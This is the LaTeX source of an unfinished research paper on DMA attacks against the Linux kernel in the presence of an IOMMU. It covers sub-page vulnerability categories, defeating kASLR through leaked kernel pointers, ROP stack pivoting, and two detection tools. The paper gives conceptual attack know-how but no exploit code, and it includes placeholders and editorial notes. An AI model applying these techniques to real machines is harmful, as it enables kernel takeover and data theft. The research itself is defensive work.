%\documentclass[sigplan,review,anonymous]{acmart}
\documentclass[sigplan,10pt]{acmart}
\acmSubmissionID{336}
\renewcommand\footnotetextcopyrightpermission[1]{}
\settopmatter{printacmref=false}
%\documentclass[letterpaper,twocolumn,10pt]{article}
%\usepackage{usenix2019_v3}
%\pagestyle{plain}


\usepackage{color}
\usepackage{xspace}
\usepackage{graphicx}
\usepackage{subcaption}
\usepackage[english]{babel}
\usepackage{textcomp}
\usepackage{times}
\usepackage{amsmath}
\usepackage{setspace}
\usepackage[inline]{enumitem}
\usepackage{natbib}
\usepackage{graphicx}
\usepackage[normalem]{ulem}
\usepackage{soul}
\usepackage{latexsym}
\usepackage{bbding}
\usepackage{pbox}
% to be able to draw some self-contained figs
\usepackage{tikz}
\usepackage{amsmath}
\usepackage{fancyvrb}
\usepackage{listings}
\usepackage{adjustbox}
\usepackage{comment}
\usepackage{enumitem}
%striketrough
\usepackage[normalem]{ulem}
\usepackage{soul}
\usepackage{xspace}
\usepackage{enumitem,kantlipsum}

\usepackage{xcolor}
%\usepackage[dvipsnames]{xcolor}
\usepackage{adjustbox}
\usepackage{graphicx}
%\usepackage[table,xcdraw]{xcolor}

% inlined bib file
\usepackage{filecontents}

% break long urls
\usepackage{url}
\makeatletter
\g@addto@macro{\UrlBreaks}{\UrlOrds}
\makeatother


\providecommand{\data}{\textit{data}\xspace}
\providecommand{\shinfo}{\texttt{skb\_shared\_info}\xspace}
\providecommand{\skb}{\texttt{sk\_buff}\xspace}
\providecommand{\page}{\texttt{struct page}\xspace}
\providecommand{\uarg}{\texttt{ubuf\_info}\xspace}
\providecommand{\kva}{KVA\xspace}
\providecommand{\iova}{IOVA\xspace}
\providecommand{\mabaf}{malicious buffer\xspace}
\providecommand{\Mabaf}{Malicious buffer\xspace}
\providecommand{\spb}{SPB\-2\xspace}
\providecommand{\oportunity}{\textcolor{red}{Opportunity}\xspace}
\providecommand{\means}{\textcolor{red}{Means}\xspace}
\providecommand{\motivation}{\textcolor{red}{Motive}\xspace}
%\providecommand{\motivation}{\textit{Ma\-buff}\xspace}
\providecommand{\simple}{\textit{single-step}\xspace}
\providecommand{\Simple}{\textit{Single-step}\xspace}
\providecommand{\compound}{\textit{compound}\xspace}
\providecommand{\Compound}{\textit{Compound}\xspace}
\providecommand{\subpage}{sub-page\xspace}
\providecommand{\Subpage}{Sub-page\xspace}
%\providecommand{\tool}{SCAT\xspace}
\providecommand{\tool}{SPADE\xspace}
\providecommand{\dkasan}{D-KASAN\xspace}
\providecommand{\version}{5.0\xspace}
\providecommand{\latestversion}{5.6\xspace}

\newcommand{\SV}[1]{{\textcolor{red}{[Alex\&Shay:#1}]}} 
\newcommand{\adam}[1]{{\footnotesize\color{blue}[Adam: #1]}}

\newcommand{\X}{\textcolor{red}{\XSolidBrush}}
\newcommand{\V}{\textcolor{green}{\Checkmark}}
%BUFFER & ADDRESS & ACCESS
%-------------------------------------------------------------------------------
\begin{document}
%-------------------------------------------------------------------------------


%don't want date printed
%\date{}

% make title bold and 14 pt font (Latex default is non-bold, 16 pt)
%\title{\Large \bf Motive, Means \& Opportunity: The Anatomy of DMA Attacks}
%\title{\Large \bf The Anatomy of IOMMU subverting DMA Attacks}

%\title{Understanding DMA Attacks in the Presence of an IOMMU}
\title{Characterizing, Exploiting, and Detecting DMA Code\\ Injection Vulnerabilities in the Presence of an IOMMU}
%\title{\Large \bf Endemic Weakness in DMA I/O: The Anatomy of DMA Attacks}
%\title{\Large \bf Systematizing DMA Vulnerabilities}
%\title{\Large \bf Endemic Weakness in DMA I/O: Systematizing DMA Vulnerabilities}

%\author{Markuze Alex$^{\dagger,\diamond}$}
%\author{Shay Vargaftik}
%\affiliation{VMware Research}
%\author{Gil Kupfer}
%\author{Boris Pismeny}

%\affiliation{\institution{$^{\dagger}$Technion -- Israel Institute of Technology}}
%\affiliation{\institution{$^{\diamond}$VMware}}
%\affiliation{\institution{$^{\ddagger}$Tel Aviv University }}
%\affiliation{Technion -- Israel Institute of Technology}
% % USENIX Security has double blind submissions
 \author{%
   Alex Markuze$^{\dagger,\diamond}$   \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ 
   Shay Vargaftik$^{\diamond}$   \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ 
   Gil Kupfer$^{\dagger}$   \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ 
   Boris Pismeny$^{\dagger}$\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ 
   Nadav Amit$^{\diamond}$   \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \
   Adam Morrison$^{\ddagger}$ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \
   Dan Tsafrir$^{\dagger,\diamond}$
 }
\affiliation{
   \institution{%
     \ \\[-2mm]
     $^{\dagger}$Technion -- Israel Institute of Technology
     \ \ \ \ \ \ \ \ \ \ \ \ \ 
     $^{\ddagger}$Tel Aviv University 
     \ \ \ \ \ \ \ \ \ \ \ \ \ 
     $^{\diamond}$VMware\\
     \ \\
 }}
 
\renewcommand{\shortauthors}{Markuze, Vargaftik, Kupfer, Pismeny, Amit, Morrison, and Tsafrir}
  %\gdef\authors{Alex Markuze, Shay Vargaftik, Gil Kupfer, Boris Pismeny, Nadav Amit, Adam Morrison, and Dan Tsafrir}
% \begin{comment}
%\author{ 
%    {Markuze Alex Technion, VMware Research}
    %\and
    %{Shay Vargaftik}\\VMware Research
%}
%{\rm Markuze Alex}\\
%Technion, VMware Research \\
%}
% \and
% {\rm Shay Vargaftik}\\
% VMware Research \\
% \and
% {\rm Gil Kupfer}\\
% Technion \\
% \and
% {\rm Nadav Amit}\\
% VMware Research
% \and
% {\rm Dan Tsafrir}\\
% Technion, VMware Research \\} % end author
% \end{comment}

%\maketitle
%-------------------------------------------------------------------------------
\begin{abstract}
%-------------------------------------------------------------------------------
%\textcolor{red}{Before: chaos Now Oder == MMO, taxonomy of DMA vulnerabilities Result \compound attacks. + tool. We expose  a deep-rooted issue in OS design rather than ad-hoc buggies... The language:\simple vs. \compound, MMO, \subpage types.}


Direct Memory Access (DMA) makes the system vulnerable to DMA attacks, in which I/O devices access memory regions not intended for their use. Hardware IOMMU protection cannot prevent all DMA attacks because it restricts DMA at page-level granularity leading to \subpage vulnerabilities. Conventional wisdom is that \subpage vulnerabilities that lead to viable DMA attacks are made possible by buggy device drivers or poor (but isolated) driver design choices.

This paper disproves the above belief, showing that it is often the kernel design that enables a DMA attack. To this end, we first categorize \subpage vulnerabilities into four categories, providing insight into the structure of DMA vulnerabilities. 
Then, to exploit these vulnerabilities, we identify a set of three vulnerability attributes which are sufficient to execute code injection attacks. 

We then build analysis tools that detect \subpage vulnerabilities and analyze the Linux kernel. 
We find that 72\% of the device drivers expose sensitive callback pointers, which may be overwritten by a device to hijack kernel control flow.

Aided by the tools' output, we demonstrate novel code injection attacks on the Linux kernel we term \compound{} attacks.
Specifically, while all previously reported attacks are \emph{single-step}, i.e., with the vulnerability attributes present in a single page, in \compound{} attacks, the vulnerability attributes are initially incomplete. However, they can be attained by carefully exploiting standard OS behavior. 

\end{abstract}
\maketitle

%-------------------------------------------------------------------------------
%-------------------------------------------------------------------------------

\section{Introduction}
\textcolor{red}{Please excuse the excessive hyperbole and needless repletion... the current version attempts to capture the spirit 
of the Intro to be; rather than to be the Intro itself }
\textcolor{blue}{
In this work we present a conceptual framework, for privilege escalation attacks, by DMA capable devices.
We focus on the most popular OS; coincidentally; w/o any known DMA attacks against it. We define, MMO in the context of DMA attacks; a schema to analyze DMA vulnerabilities. We demonstrate that DMA attacks go beyond trivial exploits in the presence of bad DMA hygiene. DMA vulnerabilities are a direct result of systematic disregard to DMA risks; resulting in APIs that make it a challenge to write a device driver that is not security liability. We focus on network devices, because these devices inherently, are easier to control remotely. But, the bad hygiene and the risks described are not limited to networking; as we show with the FireWire driver. DMA attacks are harder than it may seem; a malicious device with DMA access; can wreck havoc on existing systems. But, the triviality of the reported attacks; where a single buggy design choice compromises a system; is actually, a bane to security. In this work, we show that executing a DMA attack is not necessarily trivial, even when the attacker has unprivileged access. We show, that in order to execute a DMA and attacker must have all three out of \means,\motivation and \oportunity. On the one hand gaining all three is non trivial, which may cause a false sense of security; and on the other the pursuit, of all needed ingredients reveals a deep-seated disregard for DMA vulnerabilities. Previous works have resulted in local fixes, but not the adaptation of holistic solutions. We demonstrate how, even, when one layer of the network stack is trying to behave securely, it will often be subverted by a different layer of the same OS. We farther, show how a bad API inevitably leads to a compromised OS, and poor design choices. Ours is the first work to propose a schema for understanding DMA attacks, revealing the danger to be innate to DMA devices rather than just a set of anecdotal security flaws.}
\section{Background}
\subsection{IOMMU}
\subsection{Mitigations}
\subsubsection{per device mappings}
\subsubsection{KASLR}
Memory models, pfn > page > kva
\subsubsection{NX-BIT}
\section{OS Defences}
In this section we discuss the common mechanisms used to mitigate code injection attacks. Subverting these countermeasures is essential to the success of any DMA attack.
\subsection{kASLR}
Address Space Layout Randomization (ASLR) is a common mechanism for mitigating code-execution attacks in the context of user-level processes. To inject code into a process, the attacker must know the memory layout. For example, the address of the code section is required for finding ROP gadgets \ref{sec:nx-bit}). Systems that support ASLR randomize the memory layout for each process on every execution. In this way, regular attacks, which are built for a specific layout, cannot work. Similarly, kASLR \cite{kalsr} randomizes the memory layout of the kernel. kASLR treats the entire kernel as a single region, randomizing only its base address. Hence, knowing even one pointer is enough to deduce the base address. Once the base address is known, the attacker can use it to patch the payload. In Linux, the high bits of every kernel pointer are always set to one. The specific number of bits depends on the region to which the pointer points. Even with kASLR, pointers to the kernel binary region are always in the range [0xffffffff80000000,0xffffffffc0000000)\footnote{The Linux memory layout is conveniently provided in 
\url{ https://elixir.bootlin.com/linux/v5.3.6/source/Documentation/x86/x86_64/mm.rst }
} and, therefore, they are very easy to detect. In addition, since (at least currently) kASLR works in multiplies of 2MB granularity, once a pointer is known, it is also easy to conclude to which symbol in the binary it points. Malicious devices can scan pages mapped for reading, looking for kernel pointers colocating with their buffers. Once such a pointer is identified, all that remains is to reduce the offset of the symbol in the binary from the pointer to get the base address. We found that there is a symbol visible to both FireWire and NICs in all Linux versions we tested, making it suitable for breaking kASLR. Starting from version 2.6.24, Linux supports network namespaces for isolating different instances of network use. 
\newline 
Every network object (and sockets, in particular) has a pointer to its namespace object. Moreover, at least one namespace is always defined by the global object init net. Since TX packets have varying sizes, NICs can see all kinds of dynamically allocated objects, including sockets. In addition, socket objects are about the same size as sbp2 management orb, making them allocated from the same pages. Hence, both of them can see socket objects and, thus also the address of init net. Using this pointer, the attacker can deduce the base address and complete the attack. Starting from version 4.8, the direct mapping base is also randomized (in alignment of at least 1GB), and it is guaranteed to be in the range [0xffff880000000000, 0xffffc80000000000).

\subsubsection{NX-BIT}\label{sec:nx-bit}
When exploiting a sub-page vulnerability (section \ref{sec:subpage}) a peripheral device has access with read/write permissions to memory buffers it shouldn't. Gaining write access to a function pointer can allow the attacker to inject malicious code. DMA capable devices, usually get access to pages with data, rather than code. Modern OSs make use of hardware support, namely the No-eXecute bit, to prevent running code from data pages. The bit for each page is defined in MMU’s page tables. Whenever the CPU tries to fetch code from memory, this bit is checked. If it is set, instead of running the code, the CPU will raise an exception to the OS, notifying it that someone is trying to break into the system. This method is known under the names NX\-bit, W xor X (Write xor eXecute) and DEP. Seemingly stopping any code injection attacks.\newline
Return Oriented Programming (ROP) Return Oriented Programming (ROP) is a common method used by malware to bypass DEP defenses \cite{RBSS12}. ROP takes advantage of the fact that the CPU stack pointer may point to any data page. To set up an attack from a data page, the attacker builds a stack filled with required data and pointers to special locations in the code section (aka ROP gadgets) in it. Each gadget is a short piece of code—usually one or two commands, and a return command. When the CPU executes a return command, the next address to fetch code from is taken from the stack. If the stack has been built correctly, the next address points to another gadget and so on. By carefully selecting these gadgets, an attacker may run any payload. A similar technique that uses jumps instead of returns—and, therefore, does not use the stack—is called Jump Oriented Programming (JOP) \cite{BJFL11}. The case when an attacker is able to overwrite the stack (e.g., buffer overflow in the stack) is simple. This, however, is not the common case, and it is not the case when talking about DMA pages or page cache. To make ROP work, the attacker must first pivot the stack into the data page. This is done using JOP gadgets that direct the stack pointer to the desired page.
\subsubsection{Mitigations in the wild}
\textcolor{magenta}{I imagine a table with OS on Y and best practices on X.
IOMMU policy, KASLR, NX-bit, discriminate mapping (R or W, not both), device IOVA separation, sand boxing mapped addresses.
Kernels Win,MacOS,FreeBSD - use NDSS paper, contribution: ESX (Need to send some emails), Linux - Ubuntu versions, Sless?(RHEL)}.
\section{MMO}\label{sec:mmo}

In this section, we introduce the MMO (\motivation, \means, \oportunity) schema. We contend that a malicious device, just like a human criminal, needs Motive, Means, and Opportunity to perpetuate its attack. Using this schema, we can better understand the DMA vulnerabilities of an OS, the viability of possible DMA attacks, and their prevention. 

For example, using MMO schema, we are able to lay out the necessary conditions for a successful privilege escalation attack (i.e., code injection). Specifically, a malicious device needs all three prerequisites:
\begin{enumerate}
    \item \motivation: A kernel buffer filled with malicious code (e.g., a valid ROP attack) -- a \mabaf.
    \item \means: The kernel virtual address (\kva) of a \mabaf. Given the device is using \iova, the attacker needs to obtain the \kva{}, for example, by observing leaked pointers. 
    \item \oportunity: Write access to a known pointer, which can alter the CPU control flow. For example, write access to a data structure that holds a function callback pointer, at a known offset\footnote{The Linux kernel randomizes the layout of some data structures with \_\_randomize\_layout annotation \cite{rand_layout}.}.
\end{enumerate}

Another example is a full memory dump attack, which can be executed by merely having \oportunity. In this case, we are able to modify the kernel control flow in such a way as to cause it to dma\_map arbitrary kernel addresses at will. In order to achieve this, an attacker will need to modify a kernel pointer once before it is mapped and for a second time before send (i.e., TX) completion in order to avoid memory corruption (Section \ref{sec:linux_net}). 

To further emphasize the significance of the MMO attributes, we present a hypothetical scenario. Assume a NIC has write access to a page containing an RX packet (i.e., a received packet). Due to sub-page vulnerability and a random allocation coincidence, a structure with a callback pointer is inadvertently accessible with write permission. Also, the malicious device is able to create a valid \mabaf{} in the aforementioned page. It may seem that the device has a valid attack, whereas it actually lacks two essential prerequisites.

\begin{itemize}
    \item Missing \means: Without a valid \kva{} of the writable page, the device can not modify the callback function pointer to indicate the \mabaf.
    \item Missing \oportunity: Although a callback function pointer is available for modifications, the device has no way of knowing: 
    \begin{enumerate}
        \item[(a)] That a callback function pointer is available for sabotage.
        \item[(b)] The correct offset of the callback function pointer.
    \end{enumerate}
\end{itemize}

Under the hypothesized circumstance, and without additional information, a malicious device has practically no valid attack options. 
And while corrupting random kernel memory is still a possibility and may even cause a kernel panic \cite{MMT16}, it does not achieve the goal of privilege escalation.

\begin{figure}[t]
    \centering
    \includegraphics[width=1\columnwidth]{figs/subpage.pdf}
    \caption{Sub-page DMA vulnerabilities when the I/O buffer resides in
a page that also holds other data: (a) I/O buffer metadata, (b) memory allocator’s
metadata (c) randomly co-located sensitive buffers, (d) Page mapped by multiple \iova}
    \label{fig:colocation}
\end{figure}

\begin{comment}
\subsection{Attack Mechanics}
Given that:
\begin{enumerate}
    \item IOMMU hardware is correctly implemented 
    \item IOMMU is correctly initialized and on time
\end{enumerate}
%One might assume that the systems are safe from DMA attacks. We contend that this is not the case. The \textit{least-privilege principle} requires that an entity such as a software module or a physical device must always have only the minimum necessary access to operate normally. In this chapter, we describe the risks caused by software when this principle is violated.
\end{comment}

\subsection{Sub-Page Vulnerability}\label{sec:subpage}

We classify the different types of potentially co-located data, into four categories, as illustrated in Figure~\ref{fig:colocation}:

\begin{enumerate}
    \item[(a)] The I/O buffer is part of a bigger data structure. In some cases, this data structure may include function pointers. Often caused by poor DMA hygiene, by the driver authors. We demonstrate a full exploit in section \ref{sec:sbp2_attack}. A local driver is needed to fix such situation.
    \item[(b)] The OS (e.g., memory allocator) rather than the driver saves metadata, such as free-lists, on the same page as the I/O buffer \cite{Cor07}. Manipulating these data structures may also compromise the system  \cite{ak09}. Similar to (a), but this time its an OS subsystem that is at fault rather than the device driver. We demonstrate attacks, made possible, by an OS subsystem in section \ref{sec:linux_net}.
    \item[(c)] The I/O buffer and another dynamically allocated memory may coincidentally share a page. This common situation causes data leakage (e.g., kernel pointers).
    Currently, the Linux kernel uses the same memory allocation mechanism (e.g., kmalloc) for both I/O buffers and regular kernel memory use. Consequently, I/O buffers often share pages with other, potentially sensitive, kernel buffers. Since IOMMU works in page granularity, the respective I/O devices gain access to these kernel buffers as well. This, is a subclass of (b), as its caused by an OS subsystem; but the main difference is that, the exposed data structures are leaked randomly.
     \item[(d)] The same page is mapped multiple times due to co-located device driver buffers. Resulting in multiple \iova{} to the same page. A seemingly benign case, made dangerous by the fact, that unmapping one \iova{} is meaningless, security wise. The device will retain access to the physical page as long as a single valid \iova{} exists. We discuss the implications of this scenario in section \ref{sec:linux_net}.
\end{enumerate}

\subsection{Static Analysis Tool}

Inspired by the MMO schema, we devise a static code analysis tool to classify device drivers by levels of risk. With well over a 1000 \texttt{dma\_map*} function calls, in the Linux Kernel alone, a manual process would be arduous.
Our static analysis tool flags drivers where \means{} or \oportunity{} are present. In the case of I/O devices \motivation{} is usually trivial as the device has a legitimate write access. The tool looks for \texttt{dma\_map*} functions and traces back the call stack to identify if the mapped buffer is embedded inside a data structure (Figure \ref{fig:colocation} (a)); additionally we look for jeopardous functions (e.g \texttt{build\_skb}), that create a data structure inside a mapped buffer (Figure \ref{fig:colocation} (b)). The risk is classified according to the access permission, \motivation{}, implied by a READ permission, or \oportunity{} ,implied by a WRITE/BIDIRECTIONAL permission. 
Finally, the output of the tool presents structured and filtered findings conductive for deeper human expert analysis to determine if a viable attack is feasible.

%In case (a),  
%Other fields in such data structures might be dangerous as well.
%We used randomly colocated pointers to break kASLR, as we discuss in Chapter 5. Why do OSs ignore the disparity between I/O buffer allocation alignment and protection granularity? One possible explanation is the benefits of dense memory allocations: lower internal memory fragmentation, which results in higher memory utilization, and lower translation lookaside buffer (TLB) pressure, which reduces the number of TLB misses. We suspect, however, that the main reason for the disparity is actually more prosaic. As IOMMUs were introduced to commodity servers relatively recently, OS developers have been reluctant to overhaul existing device drivers and change the way they allocate and manage their memory. Instead, IOMMU mapping operations were abstracted from device drivers, and implemented on top of existing DMA APIs [MHJ, The]. As a result, the memory allocation of I/O buffers has not been modified and adapted to take into consideration the IOMMU protection granularity.

\subsection{Deferred Invalidation vulnerability} 
\begin{figure*}[t]
    \centering
    \includegraphics[width=1.3\columnwidth]{figs/deferred.png}
    \caption{Strict vs. deferred IOTLB invalidations. In deferred mode, there is a period
where the data is accessible but the mapping no longer exists.}
    \label{fig:deferred}
\end{figure*}
To translate addresses efficiently, the IOMMU caches translations in an input/output translation lookaside buffer (IOTLB). Like MMUs, IOMMUs do not maintain consistency between the IOTLB and the IOMMU page tables, which reside in memory; instead, the OS is required to restore consistency by explicitly invalidating the IOTLB. Therefore, to ensure that the IOTLB never holds stale entries, the OS must invalidate the IOTLB immediately after it removes memory mappings. Yet this scheme, called the “strict” mode in Linux, can degrade performance, as IOTLB invalidations can induce very high overhead \cite{MMT16,MSMT18,Peleg15}. In I/O intensive workloads, the number of required IOTLB invalidations can be extremely high, as IOMMU entries are unmapped following each I/O operation. Moreover, the overhead of each IOTLB invalidation can be as high as 2000 cycles \cite{ABYTS11}, considerably more than TLB invalidation, which takes roughly 100 cycles \cite{Han14}. To reduce this overhead, Linux defers TLB invalidations by default, and instead performs periodic global TLB invalidations. This “deferred” mode induces smaller performance overheads relative to the alternative “strict” mode. Nevertheless, as depicted in Figure \ref{fig:deferred}, deferring IOTLB invalidations may not prevent I/O devices from accessing unmapped pages, as the IOMMU may perform translations using stale IOTLB entries until the actual invalidation. This behavior introduces a security hazard, as the OS can reuse pages for other purposes after they are unmapped, regardless of the actual time of IOTLB invalidation. In the time window between the unmap operation and the actual invalidation, the OS may place sensitive data in the unmapped page-frame which the device may then read or modify. This time frame may be as high as 10 milliseconds when I/O traffic is low \cite{MSMT18}. In fact, this is a common scenario, as OSs prefer to reuse “hot” page-frames, recently freed, as they are likely to be already cached in the CPU caches\cite{hotcold}
. Therefore, it is possible in certain cases to predict how unmapped memory would be reused and which data it would expose.  
%As we demonstrate in Section 4.3, this behavior enables us to build robust assaults powerful enough to gain full control over a victim system.
\subsection{Threat Model}
Our attacks are built on the following assumptions:
\begin{enumerate}
    \item The actual attack is performed by a DMA-capable malicious device.
    \item There is software that violates the least-privilege principle with respect to the I/O device. The inherent vulnerabilities in the common use of the IOMMU make this a realistic assumption (§\ref{sec:sbp2_attack}). 
 \end{enumerate}
 The attacks discussed in this work are not executed by modifying the victim’s OS or drivers. We also assume that any hardware aside from the specific malicious device is working as expected, especially the DMA controller and the IOMMU itself. We also do not consider ports intended for debugging (e.g., jtag).
\subsection{Consequences}
The greatest potential consequence of our attacks is privilege escalation, which allows attackers to execute arbitrary code with kernel privileges. In all our experiments, we successfully executed code in the context of the kernel. Another, potential consequence is full system memory; these are harder to thwart and even harder to detect.  
Lastly, a consequence of a simple attack is denial of service \cite{MMT16}; where we crush the OS. Ideally, malformed devices should not be able to crash the entire system. The IOMMU is expected to properly isolate the devices from the OS to ensure this does not happen. Bad isolation, such as colocation of different types of data in the same page, may lead to system instability. To reach the above results, the attacker must have write permissions to some memory region. When an attacker has only read permissions, the consequences may still be interesting as they may lead to data leakage\cite{thunder}. The kernel often keeps sensitive data such as encryption keys and passwords as plain-text in memory. Attackers may use incorrect read permissions to leak this sensitive information.
\section{Static Analysis Tool}

Inspired by the MMO schema, we devise a static code analysis tool to identify vulnerabilities to DMA attacks. With well over a 1000 \texttt{dma\_map*} (i.e., the set of functions implementing the DMA API) function calls, in the Linux Kernel, a manual process would be arduous. Our static analysis tool flags drivers where \oportunity{} is present. In the case of I/O devices \motivation{} is usually trivial as the device has legitimate write access and can freely write a poisoned ROP stack in any legitimate write accessible buffer. \means{}, is often hardest to identify and calls for human expertise. The tool looks for \texttt{dma\_map*} functions and traces back the call stack to identify if the mapped buffer is embedded inside a data structure (Fig. \ref{fig:colocation} (a)). Additionally we look for potentially hazardous functions (e.g., \texttt{build\_skb}), that create a data structure inside a mapped buffer (Fig. \ref{fig:colocation} (b)). 
%The risk is classified according to the access permission. \means{} is implied by a READ permission and \oportunity{} is implied by a WRITE/BIDIRECTIONAL permission. 
The case of multiple \iova{} (Fig. \ref{fig:colocation} (c)), is also flagged by the tool, which flags use of functions (e.g., netdev\_alloc\_skb, napi\_alloc\_skb) that may result in this type of vulnerability or any other function that uses the page frag api. 

Currently, human expert input is needed to determine which functions are truly \emph{hazardous}. As a result the tool determine type (a) vulnerabilities automatically and types (b) and (c) only with sufficient human expert input. 

%The output of the tool presents structured and filtered findings conductive for more in-depth human expert analysis to determine if a viable attack is feasible. 

Type (d) vulnerability fall under the category of random access 
%attacks and as such, requires a more profound human expert \emph{dynamic} analysis. As mentioned, this 
which is out of the scope of this paper.

\subsection{Tool Design}
The \tool operates recursively starting from a set of \textit{root functions} (e.g., dma\_mag\_single) (i.e., collecting all the function calls). The \tool utilises Cscope \cite{cscope,cscope_92} to navigate the Kernel code. Cscope is an open source tool for browsing C source code. From this initial set of calls, the \tool identifies the mapped variables and backtracks their declarations and assignments to these variables. When a data structure is identified as exposed, the \tool searches
exposed callback pointers or mapped heap pointers. The \tool also utilises \texttt{pahole}\cite{dwarves} to explore the compiled binaries for the layout of the exposed data structures. Pahole, is a tool that uses the DWARF\cite{dwarf} standardized debugging data format to examine data structure layout.

This tool is applicable to any Kernel code written in C. We intend to make the \tool available on github to benefit the research community.

%The algorithm performs the following:
%\begin{enumerate}
%    \item Identify the mapped variable.
%    \item Locate variable declaration
%        \begin{itemize}
%            \item Identify biggest enclosing data structure that is mapped.
%            \item If callbacks located stop.
%        \end{itemize}
%    \item Locate Relevant assignments. For each:
%        \begin{itemize}
%            \item In case variable is assigned from new var restart from 2. 
%            \item in case of allocation: stop.
%        \end{itemize}
%    \item If declaration is reached:
%        \begin{itemize}
%            \item If function Call: Locate all calls and return to 1.
%            \item If on heap - check if heap is mapped: stop.
%        \end{itemize}
%\end{enumerate}

\subsection{Analysis Results}
We use the tool over Linux Kernel 5.3 and find and analyse 1019\\ dma\_map\_single calls over 447 files. We dedicate a special attention to struct \shinfo which is ubiquitously in Linux networking, as nearly 60\% of the mapping calls expose \shinfo either by directly mapping the \texttt{skb->data} or via the \texttt{build\_skb} API. We also find 88 cases in which callback pointers are exposed or can be spoofed (i.e., a pointer to a data structure which contains callbacks is exposed). Additionally, \textcolor{red}{??} data structures were exposed via APIs that store \texttt{private} data structures on the same page as vulnerable meta-data, e.g., netdev\_priv, aead\_request\_ctx and scsi\_cmd\_priv. 
We summarize the results in table \ref{tab:static_analysis}. 

\begin{table}[]
    \centering
    \begin{tabular}{l|c|c}
        Stat & \# Calls total & \# Files/drivers\\\hline\hline
         Total calls & 1019 & 447\\\hline
         \shinfo mapped & 547 & 232\\
         build\_skb & 46 & 35\\
         type C vulnerability & & \\
         Callbacks Exposed & 92 & 44\\ 
         Callbacks Exposed directly & 26 \\
         Private data exposing parent & ?\\ 
         Heap Mapped & 3\\\hline
    \end{tabular}
    \caption{\tool results}
    \label{tab:static_analysis}
\end{table}

\subsection{Tool output}
For each mapping call, the \tool shows the line number of relevant declarations and assignments before the variable is mapped, allowing for a human expert to trace back and validate the vulnerability. An example output is shown in Fig. \ref{fig:tool_example}.

\SV{ Explain the example here...}

\begin{figure*}[t]

        \begin{lstlisting}[
        basicstyle = \small,
        %basicstyle=\ttfamily,
        columns = fixed,
        tabsize=8,
        %frame = l,
        xleftmargin=.1\textwidth,
        language = C
        ]

**Vulnerability**: 2644 callbacks reachable via struct mtk_aes_base_ctx
*Exposed*: struct mtk_aes_base_ctx *ctx = aes->ctx;
DECLARATION[mtk_aes_map:370]: struct mtk_aes_base_ctx *ctx = aes->ctx;
ASSIGNMENT[mtk_aes_map:371]: struct mtk_aes_info *info = &ctx->info;
*Exposed*: struct mtk_aes_info *info = &ctx->info;
DECLARATION[mtk_aes_map:371]: struct mtk_aes_info *info = &ctx->info;
CALL[mtk_aes_map:374]: ctx->ct_dma = dma_map_single(cryp->dev, info, sizeof(*info), DMA_TO_DEVICE);
                \end{lstlisting}
        \caption{ Tool output example.}
        \label{fig:tool_example}

\end{figure*}
\subsection{DMA Kernel Address SANitizer}\label{sec:dma-kasan} 

In Sec.~\ref{sec:static-analysis}, we have shown that more than 70\% of DMA-map operations result in exposed pointers. 
%Exposed pointers may be used in a DMA attack either passively to subvert KASLR or actively to execute an attack. 
Most of the remaining 30\% DMA-map operations are executed on allocated objects that are presumably not co-located on the same page with vulnerable meta-data. However, this is often not the case in practice.
Indeed, objects allocated via the kmalloc API~\cite{Cor07} may share a page with objects of similar size. As a result, vulnerable metadata may still be mapped. 
%
Such a vulnerability is not visible to \tool as it is of a dynamic nature. Accordingly, we have developed a run-time tool that reports such vulnerabilities. 

Our solution is based on an existing kernel tool, KASAN~\cite{kasan}, which is a dynamic memory error detector designed to detect out-of-bounds and use-after-free bugs. KASAN uses shadow memory to record whether a memory byte is safe to access. KASAN uses compile-time instrumentation to insert checks of shadow memory on each memory access. 
We modify KASAN to record DMA-map operations in addition to memory allocations. Our tool, termed DMA-KASAN (\dkasan) reports: 
\begin{enumerate}
    \item alloc-after-map:  kmalloc object is allocated from a mapped page.
    \item map-after-alloc:  the containing page is mapped after an object was allocated.
    \item access-after-map: the CPU accesses a DMA mapped page.
    \item multiple-map: an object is mapped multiple times with possibly different permissions.
\end{enumerate}
%alloc-after-map, map-after-alloc.We term by ``alloc-after-map'' a situation in which kmalloc object is allocated from a mapped page. Likewise, we term by ``map-after-alloc'' a situation in which the containing page is mapped after an object was allocated.
%\adam{the meaning of these terms shouldn't be in a footnote, it's important}
%The tool also detects cases when a DMA mapped page is accessed by the CPU. 
%\dkasan, therefore, identifies all cases where an allocated object was inadvertently dma-mapped after allocation or has already been allocated on a dma-mapped page. 
We tested \dkasan using our setup (Sec.~\ref{Sec:setup}).
%\adam{setup wasn't discussed or defined until this point}\SV{Added a forward ref}.
In our experiment we cloned a large project from a git repository and compiled it concurrently with light network traffic (i.e., ICMP ping). This experiment has identified numerous cases where a DMA-mapped page is used to hold network and file system metadata. Example results are shown in Fig.~\ref{fig:dkasan-report}. 
Among the identified vulnerabilities we have identified cases (e.g., line 1 in Fig.~\ref{fig:dkasan-report}) where a network I/O buffer is simultaneously mapped with READ and WRITE. The same physical page mapped twice, once for read and once for write. Such cases greatly simplify the attacker's effort. In the interest of space, such examples are omitted from the paper. 

We have also encountered cases where random kernel data structures are mapped for READ/WRITE. Some of these mapped data structures also contain callback pointers. For example, \texttt{struct assoc\_array\_edit} is mapped (line 5 in Fig.~\ref{fig:dkasan-report}) exposing callback pointers to the device. 
%
%In case of deferred protection
%It is important to note that even if these pages are invalidated, an access attempt by the device will %simply result in a dmesg warning line. Namely, the device may repeatedly probe pages for access.
\begin{figure}[t]
\begin{adjustbox}{width=0.9\linewidth}
\lstset{
    escapechar={|},
}
        \begin{lstlisting}[
        basicstyle = \small,
        %basicstyle=\ttfamily,
        columns = fixed,
        tabsize=1,
        %frame = l,
        language = C
        ]
[1] size 512 [|\color{purple}READ, WRITE|] __alloc_skb+0xe0/0x3f0
[2] size 512 [|\color{purple}WRITE|] load_elf_phdrs+0xbf/0x130
[3] size 512 [|\color{purple}WRITE|] __do_execve_file.isra.0+0x287/0x1080
[4] size 64  [|\color{purple}WRITE|] sock_alloc_inode+0x4f/0x120
[5] size 328 [|\color{purple}READ, WRITE|] assoc_array_insert+0xa9/0x7e0
        \end{lstlisting}
\end{adjustbox}
        \caption{\dkasan report example.}
        %\vspace{-3mm}
        \label{fig:dkasan-report}
\end{figure}

\subsection{Discussion and Limitations}
